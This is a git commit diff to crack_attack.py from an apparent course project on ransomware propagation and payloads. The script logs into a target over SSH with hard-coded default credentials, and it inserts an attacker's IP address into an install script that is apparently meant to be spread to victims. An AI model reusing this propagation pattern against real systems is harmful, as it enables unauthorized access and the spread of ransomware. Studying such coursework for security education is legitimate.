74514538a1668885efefc7984e9a7e91157a773c
Chilin Ubuntu 20.04 <sky707070.cv07@nctu.edu.tw>
2021-05-27 15:32:04 +0800

    Update: fix error in crack_attack.py

--- Project3-Ransomware-Propagation-and-Payload/crack_attack.py
+++ Project3-Ransomware-Propagation-and-Payload/crack_attack.py
@@ -7,7 +7,8 @@ import paramiko
 import fileinput
 import os
 
-def change_install_file_text(ssh):
+
+def change_install_file_text(ssh, filepath):
     with fileinput.FileInput(files="install.py", inplace=True) as file:
         for line in file:
             print(line.replace("ATTACKER_IP_ADDRESS", '"' + str(sys.argv[2]) + '"'), end='')
@@ -27,7 +28,7 @@ def main():
     ssh  = ssh_data("csc2021", "csc2021", 22)
     # ssh.passwd = dict.attack()
 
-    change_install_file_text(ssh)
+    change_install_file_text(ssh, filepath)
 
     s = paramiko.SSHClient()
     s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
